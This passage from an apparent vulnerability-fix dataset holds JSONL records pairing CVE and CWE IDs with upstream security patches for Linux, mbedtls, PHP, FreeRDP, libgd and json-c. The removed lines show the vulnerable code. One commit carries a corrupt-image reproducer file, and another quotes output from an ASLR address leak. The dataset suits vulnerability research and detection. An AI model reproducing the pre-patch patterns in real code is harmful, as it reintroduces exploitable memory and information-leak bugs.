||\n+\t    (dj_report->device_index > DJ_DEVICE_INDEX_MAX)) {\n+\t\tdev_err(&hdev->dev, \"%s: invalid device index:%d\\n\",\n+\t\t\t\t__func__, dj_report->device_index);\n+\t\treturn false;\n+\t}\n \n \tspin_lock_irqsave(&djrcv_dev->lock, flags);\n \tif (dj_report->report_id == REPORT_ID_DJ_SHORT) {\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2018-9989", "CWE_ID": "119", "category": "security", "commit_id": "740b218386083dc708ce98ccc94a63a95cd5629e", "commit_message": "From 740b218386083dc708ce98ccc94a63a95cd5629e Mon Sep 17 00:00:00 2001\nFrom: Krzysztof Stachowiak <krzysiek.stachowiak@gmail.com>\nDate: Tue, 13 Mar 2018 11:31:14 +0100\nSubject: [PATCH] Add bounds check before length read\n\n---\n library/ssl_cli.c | 6 ++++++\n 1 file changed, 6 insertions(+)\n\n", "diff_code": "diff --git a/library/ssl_cli.c b/library/ssl_cli.c\nindex 2534346a49..585750ef2e 100644\n--- a/library/ssl_cli.c\n+++ b/library/ssl_cli.c\n@@ -2057,6 +2057,12 @@ static int ssl_parse_server_psk_hint( mbedtls_ssl_context *ssl,\n      *\n      * opaque psk_identity_hint<0..2^16-1>;\n      */\n+    if( (*p) > end - 2 )\n+    {\n+        MBEDTLS_SSL_DEBUG_MSG( 1, ( \"bad server key exchange message \"\n+                                    \"(psk_identity_hint length)\" ) );\n+        return( MBEDTLS_ERR_SSL_BAD_HS_SERVER_KEY_EXCHANGE );\n+    }\n     len = (*p)[0] << 8 | (*p)[1];\n     *p += 2;\n \n", "owner": "ARMmbed", "repo": "mbedtls", "source": "cve"}
{"CVE_ID": "CVE-2018-15132", "CWE_ID": "200", "category": "security", "commit_id": "f151e048ed27f6f4eef729f3310d053ab5da71d4", "commit_message": "From f151e048ed27f6f4eef729f3310d053ab5da71d4 Mon Sep 17 00:00:00 2001\nFrom: Anatol Belski <ab@php.net>\nDate: Tue, 3 Jul 2018 14:04:22 +0200\nSubject: [PATCH] Fixed bug #76459 windows linkinfo lacks openbasedir check\n\n---\n ext/standard/link_win32.c | 11 +++++++++++\n 1 file changed, 11 insertions(+)\n\n", "diff_code": "diff --git a/ext/standard/link_win32.c b/ext/standard/link_win32.c\nindex 13ee88dfade5..0068a3edb1c6 100644\n--- a/ext/standard/link_win32.c\n+++ b/ext/standard/link_win32.c\n@@ -87,6 +87,7 @@ PHP_FUNCTION(readlink)\n PHP_FUNCTION(linkinfo)\n {\n \tchar *link;\n+\tchar *dirname;\n \tsize_t link_len;\n \tzend_stat_t sb;\n \tint ret;\n@@ -95,12 +96,22 @@ PHP_FUNCTION(linkinfo)\n \t\treturn;\n \t}\n \n+\tdirname = estrndup(link, link_len);\n+\tphp_dirname(dirname, link_len);\n+\n+\tif (php_check_open_basedir(dirname)) {\n+\t\tefree(dirname);\n+\t\tRETURN_FALSE;\n+\t}\n+\n \tret = VCWD_STAT(link, &sb);\n \tif (ret == -1) {\n \t\tphp_error_docref(NULL, E_WARNING, \"%s\", strerror(errno));\n+\t\tefree(dirname);\n \t\tRETURN_LONG(Z_L(-1));\n \t}\n \n+\tefree(dirname);\n \tRETURN_LONG((zend_long) sb.st_dev);\n }\n /* }}} */\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2013-4119", "CWE_ID": "476", "category": "security", "commit_id": "0773bb9303d24473fe1185d85a424dfe159aff53", "commit_message": "From 0773bb9303d24473fe1185d85a424dfe159aff53 Mon Sep 17 00:00:00 2001\nFrom: Bernhard Miklautz <bmiklautz@thinstuff.at>\nDate: Mon, 1 Jul 2013 19:24:19 +0200\nSubject: [PATCH] nla: invalidate sec handle after creation\n\nIf sec pointer isn't invalidated after creation it is not possible\nto check if the upper and lower pointers are valid.\n\nThis fixes a segfault in the server part if the client disconnects before\nthe authentication was finished.\n---\n libfreerdp/core/nla.c       | 1 +\n libfreerdp/core/peer.c      | 1 +\n libfreerdp/core/transport.c | 2 ++\n winpr/libwinpr/sspi/sspi.c  | 6 +++---\n 4 files changed, 7 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/libfreerdp/core/nla.c b/libfreerdp/core/nla.c\nindex 2b4b71992f..875c0ae735 100644\n--- a/libfreerdp/core/nla.c\n+++ b/libfreerdp/core/nla.c\n@@ -1245,6 +1245,7 @@ rdpCredssp* credssp_new(freerdp* instance, rdpTransport* transport, rdpSettings*\n \t\tZeroMemory(&credssp->negoToken, sizeof(SecBuffer));\n \t\tZeroMemory(&credssp->pubKeyAuth, sizeof(SecBuffer));\n \t\tZeroMemory(&credssp->authInfo, sizeof(SecBuffer));\n+\t\tSecInvalidateHandle(&credssp->context);\n \n \t\tif (credssp->server)\n \t\t{\ndiff --git a/libfreerdp/core/peer.c b/libfreerdp/core/peer.c\nindex 3806a736e0..eb4ad60eaa 100644\n--- a/libfreerdp/core/peer.c\n+++ b/libfreerdp/core/peer.c\n@@ -272,6 +272,7 @@ static int peer_recv_callback(rdpTransport* transport, wStream* s, void* extra)\n \t\t\t\tsspi_CopyAuthIdentity(&client->identity, &(rdp->nego->transport->credssp->identity));\n \t\t\t\tIFCALLRET(client->Logon, client->authenticated, client, &client->identity, TRUE);\n \t\t\t\tcredssp_free(rdp->nego->transport->credssp);\n+\t\t\t\trdp->nego->transport->credssp = NULL;\n \t\t\t}\n \t\t\telse\n \t\t\t{\ndiff --git a/libfreerdp/core/transport.c b/libfreerdp/core/transport.c\nindex a9a710511e..4afec5a12d 100644\n--- a/libfreerdp/core/transport.c\n+++ b/libfreerdp/core/transport.c\n@@ -159,6 +159,7 @@ BOOL transport_connect_nla(rdpTransport* transport)\n \t\t\t\"If credentials are valid, the NTLMSSP implementation may be to blame.\\n\");\n \n \t\tcredssp_free(transport->credssp);\n+\t\ttransport->credssp = NULL;\n \t\treturn FALSE;\n \t}\n \n@@ -292,6 +293,7 @@ BOOL transport_accept_nla(rdpTransport* transport)\n \t{\n \t\tfprintf(stderr, \"client authentication failure\\n\");\n \t\tcredssp_free(transport->credssp);\n+\t\ttransport->credssp = NULL;\n \t\treturn FALSE;\n \t}\n \ndiff --git a/winpr/libwinpr/sspi/sspi.c b/winpr/libwinpr/sspi/sspi.c\nindex 8747e3f016..96c9599958 100644\n--- a/winpr/libwinpr/sspi/sspi.c\n+++ b/winpr/libwinpr/sspi/sspi.c\n@@ -248,7 +248,7 @@ void* sspi_SecureHandleGetLowerPointer(SecHandle* handle)\n {\n \tvoid* pointer;\n \n-\tif (!handle)\n+\tif (!handle || !SecIsValidHandle(handle))\n \t\treturn NULL;\n \n \tpointer = (void*) ~((size_t) handle->dwLower);\n@@ -268,7 +268,7 @@ void* sspi_SecureHandleGetUpperPointer(SecHandle* handle)\n {\n \tvoid* pointer;\n \n-\tif (!handle)\n+\tif (!handle || !SecIsValidHandle(handle))\n \t\treturn NULL;\n \n \tpointer = (void*) ~((size_t) handle->dwUpper);\n@@ -839,7 +839,7 @@ SECURITY_STATUS SEC_ENTRY CompleteAuthToken(PCtxtHandle phContext, PSecBufferDes\n \n SECURITY_STATUS SEC_ENTRY DeleteSecurityContext(PCtxtHandle phContext)\n {\n-\tchar* Name;\n+\tchar* Name = NULL;\n \tSECURITY_STATUS status;\n \tSecurityFunctionTableA* table;\n \n", "owner": "FreeRDP", "repo": "FreeRDP", "source": "cve"}
{"CVE_ID": "CVE-2016-3074", "CWE_ID": "189", "category": "security", "commit_id": "2bb97f407c1145c850416a3bfbcc8cf124e68a19", "commit_message": "From 2bb97f407c1145c850416a3bfbcc8cf124e68a19 Mon Sep 17 00:00:00 2001\nFrom: Mike Frysinger <vapier@gentoo.org>\nDate: Sat, 16 Apr 2016 03:51:22 -0400\nSubject: [PATCH] gd2: handle corrupt images better (CVE-2016-3074)\n\nMake sure we do some range checking on corrupted chunks.\n\nThanks to Hans Jerry Illikainen <hji@dyntopia.com> for indepth report\nand reproducer information.  Made for easy test case writing :).\n---\n .gitignore                     |   1 +\n src/gd_gd2.c                   |   2 ++\n tests/Makefile.am              |   3 ++-\n tests/gd2/gd2_read_corrupt.c   |  25 +++++++++++++++++++++++++\n tests/gd2/invalid_neg_size.gd2 | Bin 0 -> 1676 bytes\n 5 files changed, 30 insertions(+), 1 deletion(-)\n create mode 100644 tests/gd2/gd2_read_corrupt.c\n create mode 100644 tests/gd2/invalid_neg_size.gd2\n\n", "diff_code": "diff --git a/.gitignore b/.gitignore\nindex a68f3b9c..35acd71d 100644\n--- a/.gitignore\n+++ b/.gitignore\n@@ -150,6 +150,7 @@ Makefile.in\n /tests/gd2/gd2_im2im\n /tests/gd2/gd2_null\n /tests/gd2/gd2_read\n+/tests/gd2/gd2_read_corrupt\n /tests/gdimagearc/bug00079\n /tests/gdimageline/gdimageline_aa\n /tests/gdimageline/bug00072\ndiff --git a/src/gd_gd2.c b/src/gd_gd2.c\nindex 6f284610..a50b33d6 100644\n--- a/src/gd_gd2.c\n+++ b/src/gd_gd2.c\n@@ -165,6 +165,8 @@ _gd2GetHeader (gdIOCtxPtr in, int *sx, int *sy,\n \t\t\tif (gdGetInt (&cidx[i].size, in) != 1) {\n \t\t\t\tgoto fail2;\n \t\t\t};\n+\t\t\tif (cidx[i].offset < 0 || cidx[i].size < 0)\n+\t\t\t\tgoto fail2;\n \t\t};\n \t\t*chunkIdx = cidx;\n \t};\ndiff --git a/tests/Makefile.am b/tests/Makefile.am\nindex ed2c35b4..b582266b 100644\n--- a/tests/Makefile.am\n+++ b/tests/Makefile.am\n@@ -129,7 +129,8 @@ endif\n \n if HAVE_LIBZ\n check_PROGRAMS += \\\n-\tgd2/gd2_null\n+\tgd2/gd2_null \\\n+\tgd2/gd2_read_corrupt\n endif\n \n if HAVE_LIBPNG\ndiff --git a/tests/gd2/gd2_read_corrupt.c b/tests/gd2/gd2_read_corrupt.c\nnew file mode 100644\nindex 00000000..11f6a67b\n--- /dev/null\n+++ b/tests/gd2/gd2_read_corrupt.c\n@@ -0,0 +1,25 @@\n+/* Just try to read the invalid gd2 image & not crash. */\n+#include \"gd.h\"\n+#include <stdio.h>\n+#include <stdlib.h>\n+#include \"gdtest.h\"\n+\n+int main()\n+{\n+\tgdImagePtr im;\n+\tFILE *fp;\n+\tchar path[1024];\n+\n+\t/* Read the corrupt image. */\n+\tsprintf(path, \"%s/gd2/invalid_neg_size.gd2\", GDTEST_TOP_DIR);\n+\tfp = fopen(path, \"rb\");\n+\tif (!fp) {\n+\t\tprintf(\"failed, cannot open file\\n\");\n+\t\treturn 1;\n+\t}\n+\tim = gdImageCreateFromGd2(fp);\n+\tfclose(fp);\n+\n+\t/* Should have failed & rejected it. */\n+\treturn im == NULL ? 0 : 1;\n+}\ndiff --git a/tests/gd2/invalid_neg_size.gd2 b/tests/gd2/invalid_neg_size.gd2\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..3075f15a81a5ac0312f1548ef7733726c58c1f24\nGIT binary patch\nliteral 1676\nzcmYdKF=Aj~VqgS92QbaVz`&x(z`&3Xq-XpG0w8-7jE2By2#o9ys9<DFVVM2jkq&_A\nzrDUq`{Y^Pj0@g4#f0QiA55HlZ@HF9tMV4@gn1|r?E8jjStJyO=Js<hwb(hMKkhS`+\nzIH#n4b81fOwK1Q}GC6xgli<E9^KAlt^6h-|{O7gG+mZ)9yjgNsGr@B1WVxObuQtrM\nz#=^yN#mUv!UZ(isn|)g<Gm@q5JT~X>)=nrYtl!eO@Y0j(uP24Oy8cV*JZTi%$LjUn\nzHzKcM%atz4N1|6Bc&yqQwj{71^7_XwahG!Za#qgRp0&AK_7P)ivKtpiqy+Qht#SF*\nzMaQJhn^t_9qk56qrqA%Mh<Mrlt=-}^_8Zw$*2~9UTQu|P_ebAXt^L@%Vt&w)*ca?Q\nzmoGA&ZC@r<dvR&!HA|J%GCJj_qO%-7e~P{{Z%T`}?Mk-4Qs-VbA2hzb+D@-d@!0Z+\nzna|e#ek}Mja+lhIXxR|+VBxjjJloZ}IRBU@_!{=-_#X*LR5`n@?<Lo!M7h*c?@zVv\nzYd=`G>{#vZ%zd@pEzz2O-%mf&R%I<VH&wT7kAHuuw|n=Ay_LQ$h6%e%zJGeR{l>8q\nzf?T2nbvg-FtoADt&xdhev;R0l>jm4q7qbJdANGtCPvX9R`uql)<-sap|IGrVrT6W5\nzXnv=f!*bd}GjY+2hGIKyAG$nqUSL?uGc}?vV9J_*x4-T7>?=Ea+<1Qdhx_^N-fMX)\nOZWwA+Ogk&gc>@5dGaWbp\n\nliteral 0\nHcmV?d00001\n\n", "owner": "libgd", "repo": "libgd", "source": "cve"}
{"CVE_ID": "CVE-2016-5094", "CWE_ID": "190", "category": "security", "commit_id": "0da8b8b801f9276359262f1ef8274c7812d3dfda", "commit_message": "From 0da8b8b801f9276359262f1ef8274c7812d3dfda Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Sun, 15 May 2016 23:26:51 -0700\nSubject: [PATCH] Fix bug #72135 - don't create strings with lengths outside\n int range\n\n---\n ext/standard/html.c | 50 ++++++++++++++++++++++++---------------------\n 1 file changed, 27 insertions(+), 23 deletions(-)\n\n", "diff_code": "diff --git a/ext/standard/html.c b/ext/standard/html.c\nindex 72423b59f0e4..81d8aff9e9ad 100644\n--- a/ext/standard/html.c\n+++ b/ext/standard/html.c\n@@ -163,7 +163,7 @@ static inline unsigned int get_next_char(\n \t\t\t\t\telse\n \t\t\t\t\t\tMB_FAILURE(pos, 4);\n \t\t\t\t}\n-\t\t\t\t\n+\n \t\t\t\tthis_char = ((c & 0x07) << 18) | ((str[pos + 1] & 0x3f) << 12) | ((str[pos + 2] & 0x3f) << 6) | (str[pos + 3] & 0x3f);\n \t\t\t\tif (this_char < 0x10000 || this_char > 0x10FFFF) { /* non-shortest form or outside range */\n \t\t\t\t\tMB_FAILURE(pos, 4);\n@@ -437,7 +437,7 @@ static enum entity_charset determine_charset(char *charset_hint TSRMLS_DC)\n \n \tif (charset_hint) {\n \t\tint found = 0;\n-\t\t\n+\n \t\t/* now walk the charset map and look for the codeset */\n \t\tfor (i = 0; charset_map[i].codeset; i++) {\n \t\t\tif (len == strlen(charset_map[i].codeset) && strncasecmp(charset_hint, charset_map[i].codeset, len) == 0) {\n@@ -545,7 +545,7 @@ static inline unsigned char unimap_bsearch(const uni_to_enc *table, unsigned cod\n \t\treturn 0;\n \n \tcode_key = (unsigned short) code_key_a;\n-\t\n+\n \twhile (l <= h) {\n \t\tm = l + (h - l) / 2;\n \t\tif (code_key < m->un_code_point)\n@@ -571,7 +571,7 @@ static inline int map_from_unicode(unsigned code, enum entity_charset charset, u\n \t\t/* identity mapping of code points to unicode */\n \t\tif (code > 0xFF) {\n \t\t\treturn FAILURE;\n-\t\t} \n+\t\t}\n \t\t*res = code;\n \t\tbreak;\n \n@@ -590,7 +590,7 @@ static inline int map_from_unicode(unsigned code, enum entity_charset charset, u\n \t\t\treturn FAILURE;\n \t\t}\n \t\tbreak;\n-\t\t\n+\n \tcase cs_8859_15:\n \t\tif (code < 0xA4 || (code > 0xBE && code <= 0xFF)) {\n \t\t\t*res = code;\n@@ -634,7 +634,7 @@ static inline int map_from_unicode(unsigned code, enum entity_charset charset, u\n \tcase cs_cp866:\n \t\ttable = unimap_cp866;\n \t\ttable_size = sizeof(unimap_cp866) / sizeof(*unimap_cp866);\n-\t\t\n+\n table_over_7F:\n \t\tif (code <= 0x7F) {\n \t\t\t*res = code;\n@@ -710,7 +710,7 @@ static inline int unicode_cp_is_allowed(unsigned uni_cp, int document_type)\n \t * Not sure this is the relevant part for HTML 5, though. I opted to\n \t * disallow the characters that would result in a parse error when\n \t * preprocessing of the input stream. See also section 8.1.3.\n-\t * \n+\t *\n \t * It's unclear if XHTML 1.0 allows C1 characters. I'll opt to apply to\n \t * XHTML 1.0 the same rules as for XML 1.0.\n \t * See <http://cmsmcq.com/2007/C1.xml>.\n@@ -774,7 +774,7 @@ static inline int numeric_entity_is_allowed(unsigned uni_cp, int document_type)\n /* {{{ process_numeric_entity\n  * Auxiliary function to traverse_for_entities.\n  * On input, *buf should point to the first character after # and on output, it's the last\n- * byte read, no matter if there was success or insuccess. \n+ * byte read, no matter if there was success or insuccess.\n  */\n static inline int process_numeric_entity(const char **buf, unsigned *code_point)\n {\n@@ -784,7 +784,7 @@ static inline int process_numeric_entity(const char **buf, unsigned *code_point)\n \n \tif (hexadecimal && (**buf != '\\0'))\n \t\t(*buf)++;\n-\t\t\t\n+\n \t/* strtol allows whitespace and other stuff in the beginning\n \t\t* we're not interested */\n \tif ((hexadecimal && !isxdigit(**buf)) ||\n@@ -969,7 +969,7 @@ static void traverse_for_entities(\n \t\t\t\tgoto invalid_code;\n \n \t\t\t/* are we allowed to decode this entity in this document type?\n-\t\t\t * HTML 5 is the only that has a character that cannot be used in \n+\t\t\t * HTML 5 is the only that has a character that cannot be used in\n \t\t\t * a numeric entity but is allowed literally (U+000D). The\n \t\t\t * unoptimized version would be ... || !numeric_entity_is_allowed(code) */\n \t\t\tif (!unicode_cp_is_allowed(code, doctype) ||\n@@ -996,9 +996,9 @@ static void traverse_for_entities(\n \t\t\t\t}\n \t\t\t}\n \t\t}\n-\t\t\n+\n \t\tassert(*next == ';');\n-\t\t\n+\n \t\tif (((code == '\\'' && !(flags & ENT_HTML_QUOTE_SINGLE)) ||\n \t\t\t\t(code == '\"' && !(flags & ENT_HTML_QUOTE_DOUBLE)))\n \t\t\t\t/* && code2 == '\\0' always true for current maps */)\n@@ -1026,7 +1026,7 @@ static void traverse_for_entities(\n \t\t\t*(q++) = *p;\n \t\t}\n \t}\n-\t\n+\n \t*q = '\\0';\n \t*retlen = (size_t)(q - ret);\n }\n@@ -1066,7 +1066,7 @@ static entity_table_opt determine_entity_table(int all, int doctype)\n \tentity_table_opt retval = {NULL};\n \n \tassert(!(doctype == ENT_HTML_DOC_XML1 && all));\n-\t\n+\n \tif (all) {\n \t\tretval.ms_table = (doctype == ENT_HTML_DOC_HTML5) ?\n \t\t\tentity_ms_table_html5 : entity_ms_table_html4;\n@@ -1111,13 +1111,13 @@ PHPAPI char *php_unescape_html_entities(unsigned char *old, size_t oldlen, size_\n \tif (retlen == 0) {\n \t\tgoto empty_source;\n \t}\n-\t\n+\n \tinverse_map = unescape_inverse_map(all, flags);\n-\t\n+\n \t/* replace numeric entities */\n \ttraverse_for_entities(old, oldlen, ret, &retlen, all, flags, inverse_map, charset);\n \n-empty_source:\t\n+empty_source:\n \t*newlen = retlen;\n \treturn ret;\n }\n@@ -1141,7 +1141,7 @@ static inline void find_entity_for_char(\n {\n \tunsigned stage1_idx = ENT_STAGE1_INDEX(k);\n \tconst entity_stage3_row *c;\n-\t\n+\n \tif (stage1_idx > 0x1D) {\n \t\t*entity     = NULL;\n \t\t*entity_len = 0;\n@@ -1162,7 +1162,7 @@ static inline void find_entity_for_char(\n \t\tif (!(*cursor < oldlen))\n \t\t\tgoto no_suitable_2nd;\n \n-\t\tnext_char = get_next_char(charset, old, oldlen, cursor, &status); \n+\t\tnext_char = get_next_char(charset, old, oldlen, cursor, &status);\n \n \t\tif (status == FAILURE)\n \t\t\tgoto no_suitable_2nd;\n@@ -1187,7 +1187,7 @@ static inline void find_entity_for_char(\n \t\t*entity = (const unsigned char *)\n \t\t\tc->data.multicodepoint_table[0].leading_entry.default_entity;\n \t\t*entity_len = c->data.multicodepoint_table[0].leading_entry.default_entity_len;\n-\t}\t\n+\t}\n }\n /* }}} */\n \n@@ -1255,7 +1255,7 @@ PHPAPI char *php_escape_html_entities_ex(unsigned char *old, size_t oldlen, size\n \n \t/* initial estimate */\n \tif (oldlen < 64) {\n-\t\tmaxlen = 128;\t\n+\t\tmaxlen = 128;\n \t} else {\n \t\tmaxlen = 2 * oldlen;\n \t\tif (maxlen < oldlen) {\n@@ -1444,6 +1444,10 @@ static void php_html_entities(INTERNAL_FUNCTION_PARAMETERS, int all)\n \t}\n \n \treplaced = php_escape_html_entities_ex(str, str_len, &new_len, all, (int) flags, hint_charset, double_encode TSRMLS_CC);\n+\tif (new_len > INT_MAX) {\n+\t\tefree(replaced);\n+\t\tRETURN_FALSE;\n+\t}\n \tRETVAL_STRINGL(replaced, (int)new_len, 0);\n }\n /* }}} */\n@@ -1577,7 +1581,7 @@ static inline void write_s3row_data(\n \t\t\t} else {\n \t\t\t\tspe_cp = uni_cp;\n \t\t\t}\n-\t\t\t\n+\n \t\t\twritten_k2 = write_octet_sequence(&key[written_k1], charset, spe_cp);\n \t\t\tmemcpy(&entity[1], mcpr[i].normal_entry.entity, l);\n \t\t\tentity[l + 1] = ';';\n@@ -1615,7 +1619,7 @@ PHP_FUNCTION(get_html_translation_table)\n \tLIMIT_ALL(all, doctype, charset);\n \n \tarray_init(return_value);\n-\t\n+\n \tentity_table = determine_entity_table(all, doctype);\n \tif (all && !CHARSET_UNICODE_COMPAT(charset)) {\n \t\tto_uni_table = enc_to_uni_index[charset];\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2014-1445", "CWE_ID": "399", "category": "security", "commit_id": "2b13d06c9584b4eb773f1e80bbaedab9a1c344e1", "commit_message": "From 2b13d06c9584b4eb773f1e80bbaedab9a1c344e1 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Salva=20Peir=C3=B3?= <speiro@ai2.upv.es>\nDate: Wed, 16 Oct 2013 12:46:50 +0200\nSubject: wanxl: fix info leak in ioctl\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nThe wanxl_ioctl() code fails to initialize the two padding bytes of\nstruct sync_serial_settings after the ->loopback member. Add an explicit\nmemset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers/net/wan/wanxl.c | 1 +\n 1 file changed, 1 insertion(+)\n\n", "diff_code": "diff --git a/drivers/net/wan/wanxl.c b/drivers/net/wan/wanxl.c\nindex 6a24a5a70cc7..4c0a69779b89 100644\n--- a/drivers/net/wan/wanxl.c\n+++ b/drivers/net/wan/wanxl.c\n@@ -355,6 +355,7 @@ static int wanxl_ioctl(struct net_device *dev, struct ifreq *ifr, int cmd)\n \t\t\tifr->ifr_settings.size = size; /* data size wanted */\n \t\t\treturn -ENOBUFS;\n \t\t}\n+\t\tmemset(&line, 0, sizeof(line));\n \t\tline.clock_type = get_status(port)->clocking;\n \t\tline.clock_rate = 0;\n \t\tline.loopback = 0;\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2013-0914", "CWE_ID": "264", "category": "security", "commit_id": "2ca39528c01a933f6689cd6505ce65bd6d68a530", "commit_message": "From 2ca39528c01a933f6689cd6505ce65bd6d68a530 Mon Sep 17 00:00:00 2001\nFrom: Kees Cook <keescook@chromium.org>\nDate: Wed, 13 Mar 2013 14:59:33 -0700\nSubject: signal: always clear sa_restorer on execve\n\nWhen the new signal handlers are set up, the location of sa_restorer is\nnot cleared, leaking a parent process's address space location to\nchildren.  This allows for a potential bypass of the parent's ASLR by\nexamining the sa_restorer value returned when calling sigaction().\n\nBased on what should be considered \"secret\" about addresses, it only\nmatters across the exec not the fork (since the VMAs haven't changed\nuntil the exec).  But since exec sets SIG_DFL and keeps sa_restorer,\nthis is where it should be fixed.\n\nGiven the few uses of sa_restorer, a \"set\" function was not written\nsince this would be the only use.  Instead, we use\n__ARCH_HAS_SA_RESTORER, as already done in other places.\n\nExample of the leak before applying this patch:\n\n  $ cat /proc/$$/maps\n  ...\n  7fb9f3083000-7fb9f3238000 r-xp 00000000 fd:01 404469 .../libc-2.15.so\n  ...\n  $ ./leak\n  ...\n  7f278bc74000-7f278be29000 r-xp 00000000 fd:01 404469 .../libc-2.15.so\n  ...\n  1 0 (nil) 0x7fb9f30b94a0\n  2 4000000 (nil) 0x7f278bcaa4a0\n  3 4000000 (nil) 0x7f278bcaa4a0\n  4 0 (nil) 0x7fb9f30b94a0\n  ...\n\n[akpm@linux-foundation.org: use SA_RESTORER for backportability]\nSigned-off-by: Kees Cook <keescook@chromium.org>\nReported-by: Emese Revfy <re.emese@gmail.com>\nCc: Emese Revfy <re.emese@gmail.com>\nCc: PaX Team <pageexec@freemail.hu>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: \"Eric W. Biederman\" <ebiederm@xmission.com>\nCc: Serge Hallyn <serge.hallyn@canonical.com>\nCc: Julien Tinnes <jln@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel/signal.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n", "diff_code": "diff --git a/kernel/signal.c b/kernel/signal.c\nindex d63c79e7e415..43b0d4a1b7ba 100644\n--- a/kernel/signal.c\n+++ b/kernel/signal.c\n@@ -485,6 +485,9 @@ flush_signal_handlers(struct task_struct *t, int force_default)\n \t\tif (force_default || ka->sa.sa_handler != SIG_IGN)\n \t\t\tka->sa.sa_handler = SIG_DFL;\n \t\tka->sa.sa_flags = 0;\n+#ifdef SA_RESTORER\n+\t\tka->sa.sa_restorer = NULL;\n+#endif\n \t\tsigemptyset(&ka->sa.sa_mask);\n \t\tka++;\n \t}\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2013-6371", "CWE_ID": "310", "category": "security", "commit_id": "64e36901a0614bf64a19bc3396469c66dcd0b015", "commit_message": "From 64e36901a0614bf64a19bc3396469c66dcd0b015 Mon Sep 17 00:00:00 2001\nFrom: Michael Clark <michael@metaparadigm.com>\nDate: Wed, 9 Apr 2014 13:48:21 +0800\nSubject: [PATCH] Patch to address the following issues:\n\n* CVE-2013-6371: hash collision denial of service\n* CVE-2013-6370: buffer overflow if size_t is larger than int\n---\n Makefile.am     |   6 +-\n Makefile.am.inc |   2 +-\n config.h.in     |   6 +\n configure.ac    |  16 +-\n json_object.h   |  12 +-\n json_tokener.c  |  11 ++\n json_tokener.h  |   8 +-\n linkhash.c      | 379 +++++++++++++++++++++++++++++++++++++++++++++++-\n linkhash.h      |   2 +-\n random_seed.c   | 237 ++++++++++++++++++++++++++++++\n random_seed.h   |  25 ++++\n 11 files changed, 691 insertions(+), 13 deletions(-)\n create mode 100644 random_seed.c\n create mode 100644 random_seed.h\n\n", "diff_code": "diff --git a/Makefile.am b/Makefile.am\nindex 24b9bdf06a..26ced27080 100644\n--- a/Makefile.am\n+++ b/Makefile.am\n@@ -23,7 +23,8 @@ libjson_cinclude_HEADERS = \\\n \tjson_tokener.h \\\n \tjson_util.h \\\n \tlinkhash.h \\\n-\tprintbuf.h\n+\tprintbuf.h \\\n+\trandom_seed.h\n \n #libjsonx_includedir = $(libdir)/json-c-@VERSION@\n #\n@@ -41,7 +42,8 @@ libjson_c_la_SOURCES = \\\n \tjson_tokener.c \\\n \tjson_util.c \\\n \tlinkhash.c \\\n-\tprintbuf.c\n+\tprintbuf.c \\\n+\trandom_seed.c\n \n \n distclean-local:\ndiff --git a/Makefile.am.inc b/Makefile.am.inc\nindex fd68a25f1f..fec591b6cf 100644\n--- a/Makefile.am.inc\n+++ b/Makefile.am.inc\n@@ -1,2 +1,2 @@\n-AM_CFLAGS = -Wall -Werror -Wextra -Wwrite-strings -Wno-unused-parameter -std=gnu99 -D_GNU_SOURCE -D_REENTRANT\n+AM_CFLAGS = -Wall -Werror -Wno-error=deprecated-declarations -Wextra -Wwrite-strings -Wno-unused-parameter -std=gnu99 -D_GNU_SOURCE -D_REENTRANT\n \ndiff --git a/config.h.in b/config.h.in\nindex 7c8973f38b..0dcab1a300 100644\n--- a/config.h.in\n+++ b/config.h.in\n@@ -1,5 +1,8 @@\n /* config.h.in.  Generated from configure.ac by autoheader.  */\n \n+/* Enable RDRANR Hardware RNG Hash Seed */\n+#undef ENABLE_RDRAND\n+\n /* Define if .gnu.warning accepts long strings. */\n #undef HAS_GNU_WARNING_LONG\n \n@@ -32,6 +35,9 @@\n /* Define to 1 if you don't have `vprintf' but do have `_doprnt.' */\n #undef HAVE_DOPRNT\n \n+/* Define to 1 if you have the <endian.h> header file. */\n+#undef HAVE_ENDIAN_H\n+\n /* Define to 1 if you have the <fcntl.h> header file. */\n #undef HAVE_FCNTL_H\n \ndiff --git a/configure.ac b/configure.ac\nindex 6ad10adf82..48c8e5f382 100644\n--- a/configure.ac\n+++ b/configure.ac\n@@ -7,6 +7,20 @@ AM_INIT_AUTOMAKE\n \n AC_PROG_MAKE_SET\n \n+AC_ARG_ENABLE(rdrand,\n+ AS_HELP_STRING([--enable-rdrand],\n+   [Enable RDRAND Hardware RNG Hash Seed generation on supported x86/x64 platforms.]),\n+[if test x$enableval = xyes; then\n+  enable_rdrand=yes\n+  AC_DEFINE(ENABLE_RDRAND, 1, [Enable RDRANR Hardware RNG Hash Seed])\n+fi])\n+\n+if test \"x$enable_rdrand\" = \"xyes\"; then\n+  AC_MSG_RESULT([RDRAND Hardware RNG Hash Seed enabled on supported x86/x64 platforms])\n+else\n+  AC_MSG_RESULT([RDRAND Hardware RNG Hash Seed disabled. Use --enable-rdrand to enable])\n+fi\n+\n # Checks for programs.\n \n # Checks for libraries.\n@@ -16,7 +30,7 @@ AM_PROG_CC_C_O\n AC_CONFIG_HEADER(config.h)\n AC_CONFIG_HEADER(json_config.h)\n AC_HEADER_STDC\n-AC_CHECK_HEADERS(fcntl.h limits.h strings.h syslog.h 